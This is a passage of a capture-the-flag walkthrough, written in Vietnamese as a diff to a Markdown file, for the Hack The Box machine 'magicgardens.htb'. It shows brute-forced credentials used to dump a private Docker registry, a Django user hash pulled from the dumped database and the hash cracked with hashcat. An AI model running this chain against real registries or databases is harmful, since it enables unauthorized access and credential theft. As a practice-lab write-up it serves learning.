@@ -76,3 +76,42 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-23 23:47:
 ```
 `alex:diamonds`<br>
 rồi xem docker tại port 5000 thôi :>
+```shell
+➜  ~ curl -k -u alex:diamonds  https://magicgardens.htb:5000/v2/_catalog
+{"repositories":["magicgardens.htb"]}
+➜  ~ cd payload/DockerRegistryGrabber
+➜  DockerRegistryGrabber git:(main) ✗ ls
+README.md  deploy.sh  deploybasicauth.sh  drg.py  magicgardens.htb  pyproject.toml  requirements.txt  screenshot
+➜  DockerRegistryGrabber git:(main) ✗ python drg.py https://magicgardens.htb:5000 -U alex -P diamonds --list
+Dunno what happend but something fucked up Failed to parse: https://magicgardens.htb:5000:5000/v2/_catalog
+➜  DockerRegistryGrabber git:(main) ✗ python drg.py https://magicgardens.htb -U alex -P diamonds --list
+[+] magicgardens.htb
+➜  DockerRegistryGrabber git:(main) ✗ python drg.py https://magicgardens.htb -U alex -P diamonds --dump_all
+```
+dump hết thôi :>> rồi vào check. Tìm từng file trong đấy sẽ thấy có file db `/usr/src/app/db.sqlite3`
+```shell
+➜  magicgardens.htb git:(main) ✗ sqlite3 480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb/usr/src/app/db.sqlite3
+SQLite version 3.44.0 2023-11-01 11:23:50
+Enter ".help" for usage hints.
+sqlite> .talbes
+Error: unknown command or invalid arguments:  "talbes". Enter ".help" for help
+sqlite> .tables
+auth_group                  django_content_type
+auth_group_permissions      django_migrations
+auth_permission             django_session
+auth_user                   store_order
+auth_user_groups            store_product
+auth_user_user_permissions  store_storemessage
+django_admin_log            store_storeuser
+sqlite> select * from auth_user
+   ...> ;
+2|pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=|2023-06-06 17:34:56.520750|1|morty|||1|1|2023-06-06 17:32:24|
+sqlite>
+```
+password của morty bị hash r -> đây là Django (PBKDF2-SHA256), thử crack nó.
+```shell
+➜  ~ hashcat -m 10000 -a 0 hash /usr/share/wordlists/rockyou.txt --show
+pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=:jonasbrothers
+➜  ~ cat hash
+pbkdf2_sha256$600000$y1tAjUmiqLtSdpL2wL3h56$61u2yMfK3oYgnL31fX8R4k/0hTc6YXRfiOH4LYVsEXo=
+```
